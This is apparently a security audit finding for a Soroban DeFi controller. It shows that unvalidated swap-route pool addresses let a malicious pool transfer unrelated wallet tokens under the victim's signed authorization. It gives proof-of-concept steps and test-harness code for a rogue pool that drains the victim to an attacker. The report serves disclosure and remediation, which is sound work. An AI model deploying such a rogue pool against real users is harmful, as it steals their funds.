### Title

Unvalidated route venue executes attacker code under the caller’s authorization and steals unrelated wallet tokens - (File: contracts/controller/src/strategies/swap.rs)

### Summary

Controller strategy entrypoints accept caller-controlled `swap` bytes and pass them to the configured router after authorizing only the router’s input-token transfer. [1](#0-0) [2](#0-1)  The router decodes route-selected pool addresses and invokes them through venue adapters without a pool allowlist. [3](#0-2) [4](#0-3)  A malicious pool can therefore execute an unrelated `token.transfer(victim, attacker, amount)` inside the same call; simulation records it beneath the victim’s signed `swap_collateral` authorization, and enforcement accepts it if that tree is signed. [5](#0-4) [6](#0-5) 

### Finding Description

`swap_collateral(caller, account_id, current, amount, new, swap)` gives a user-controlled route to `swap_tokens`. [1](#0-0)  `swap_tokens` snapshots balances, authorizes the exact controller-to-router input transfer, and invokes `execute_strategy(controller, amount_in, swap)`. [7](#0-6) 

The route’s Soroswap hop names an arbitrary pool contract; the adapter calls its `get_reserves`, transfers router input to it, and then calls its `swap`. [4](#0-3) [8](#0-7)  The dispatcher validates only that the router’s output increased and that its input decreased by the hop amount, not that the invoked pool is a trusted deployment or that it avoided unrelated authorization requests. [9](#0-8) 

A malicious pool can satisfy those measurements while issuing `token.transfer(caller, attacker, wallet_balance)` for any unrelated token held by the caller. [10](#0-9)  The repository’s auth-tree PoC demonstrates that this rogue transfer is attached to the caller’s `swap_collateral` authorization during simulation and executes when the returned poisoned tree is signed. [11](#0-10) [12](#0-11) 

### Impact Explanation

This is theft of user funds: the malicious venue can move unrelated wallet tokens that were never routed through the strategy. [13](#0-12)  The controller’s exact input authorization, overspend check, minimum-output enforcement, and measured output check do not bound that unrelated transfer. [14](#0-13) [15](#0-14) 

### Likelihood Explanation

Exploitation requires the victim to submit a poisoned route and sign the simulated authorization tree containing the extra token transfer, so it is user-interaction dependent rather than directly callable against an arbitrary account. [16](#0-15)  Once signed, no privileged role or leaked key is needed because arbitrary addresses decode as route pool targets and are invoked by the selected venue adapter. [3](#0-2) [17](#0-16) 

### Recommendation

Restrict route pool/venue addresses to a governance-approved registry or another on-chain allowlist before invoking them, rather than accepting arbitrary pool addresses from route XDR. [18](#0-17)  As defense-in-depth, require clients and quote generation to reject simulated authorization trees containing any child other than the expected router input transfer. [2](#0-1) 

### Proof of Concept

1. Deploy a malicious `RoguePair` implementing the Soroswap-facing `get_reserves` and `swap` ABI, storing `(victim, unrelated_token, attacker, amount)`, and holding enough `token_out` to pay a fair route output. [4](#0-3) [17](#0-16) 
2. Encode a `swap_collateral` route containing a Soroswap hop whose `pool` is `RoguePair`. [1](#0-0) 
3. Have the victim submit `swap_collateral(victim, victim_account, USDC, amount, ETH, poisoned_route)`. [1](#0-0) 
4. In `RoguePair.swap`, call `unrelated_token.transfer(victim, attacker, amount)`, keep the routed input, and transfer a positive `token_out` amount to the router. [10](#0-9) [9](#0-8) 
5. Simulation attaches the unrelated transfer beneath the victim’s `swap_collateral` authorization; signing that tree drains the wallet token while the strategy still receives positive measured output. [19](#0-18) [12](#0-11)

### Citations

**File:** contracts/controller/src/lib.rs (L283-291)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
```

**File:** contracts/controller/src/strategies/swap.rs (L29-48)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
```

**File:** contracts/controller/src/strategies/swap.rs (L75-83)
```rust
fn verify_router_output(env: &Env, token_out: &Address, balance_before: i128) -> i128 {
    let received = balance_delta_since(
        env,
        token_out,
        &env.current_contract_address(),
        balance_before,
    );
    assert_with_error!(env, received > 0, StrategyError::NoSwapOutput);
    received
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L63-68)
```rust
    let program = Program::decode(&env, &ops, assets.len(), amounts.len());

    let input_token = assets.get_unchecked(program.token_in);
    let output_token = assets.get_unchecked(program.token_out);
    let total_min_out = amounts.get_unchecked(program.min_out);
    if total_min_out <= 0 {
```

**File:** contracts/swap-aggregator/src/venues/soroswap.rs (L55-58)
```rust
    let (reserve_0, reserve_1): (i128, i128) = ctx.env.invoke_contract(
        &ctx.hop.pool,
        &Symbol::new(ctx.env, "get_reserves"),
        no_args,
```

**File:** contracts/swap-aggregator/src/venues/soroswap.rs (L71-87)
```rust
    let token_client = token::Client::new(ctx.env, &ctx.hop.token_in);
    token_client.transfer(ctx.router, &ctx.hop.pool, &ctx.amount_in);

    let (amount_0_out, amount_1_out) = if token_in_is_0 {
        (0_i128, requested_out)
    } else {
        (requested_out, 0_i128)
    };
    let args: Vec<Val> = vec![
        ctx.env,
        amount_0_out.into_val(ctx.env),
        amount_1_out.into_val(ctx.env),
        ctx.router.into_val(ctx.env),
    ];
    let _: () = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L166-182)
```rust
    /// Enforcing mode: Alice signs `swap_collateral` with exactly `children` beneath it.
    fn try_swap_with_signed_tree(
        &self,
        route: &Bytes,
        children: &[MockAuthInvoke],
    ) -> Result<(), soroban_sdk::Error> {
        let root = MockAuthInvoke {
            contract: &self.t.controller,
            fn_name: "swap_collateral",
            args: self.swap_args(route),
            sub_invokes: children,
        };
        self.t.env.mock_auths(&[MockAuth {
            address: &self.alice,
            invoke: &root,
        }]);
        self.try_swap(route)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L206-226)
```rust
    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L34-40)
```rust
    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L42-56)
```rust
    let received = ctx
        .output_balance()
        .checked_sub(before_out)
        .unwrap_or_else(|| panic_with_error!(env, Error::ZeroOutput));
    if received <= 0 {
        panic_with_error!(env, Error::ZeroOutput);
    }

    let after_in = ctx.input_balance();
    let spent = before_in
        .checked_sub(after_in)
        .unwrap_or_else(|| panic_with_error!(env, Error::InvalidAmount));
    if spent != amount_in {
        panic_with_error!(env, Error::InvalidAmount);
    }
```
